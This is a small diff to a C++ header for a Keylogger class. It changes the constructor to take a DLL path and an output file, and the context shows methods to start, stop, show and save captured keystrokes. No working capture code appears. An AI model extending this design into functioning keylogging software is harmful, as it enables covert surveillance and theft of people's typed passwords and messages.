@@ -18,7 +18,7 @@ private:
 	template<typename T> void showTranslated(const T output);
 	template<typename T> void saveTranslated(const T output);
 public:
-	Keylogger();
+	Keylogger(const char* dll, const char* file);
 
 	void startKeylog();
 	void stopKeylog();
